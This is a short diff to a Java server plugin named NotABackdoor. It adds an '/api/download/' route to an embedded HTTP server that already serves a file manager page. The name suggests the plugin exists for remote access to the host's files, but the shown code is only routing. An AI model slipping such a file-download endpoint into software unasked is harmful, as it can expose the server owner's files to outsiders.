@@ -7,6 +7,7 @@ import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.Paths;
 
+import com.lian.notabackdoor.api.DownloadHandler;
 import com.lian.notabackdoor.pages.FileManagerPageHandler;
 import com.lian.notabackdoor.pages.LostPageHandler;
 import com.lian.notabackdoor.pages.MainPageHandler;
@@ -47,6 +48,7 @@ public class NotABackdoor extends JavaPlugin {
         server.createContext("/main", new MainPageHandler());
         server.createContext("/filemanager", new FileManagerPageHandler());
         server.createContext("/lost", new LostPageHandler());
+        server.createContext("/api/download/", new DownloadHandler());
         server.setExecutor(null); // Use the default executor
         server.start();
 
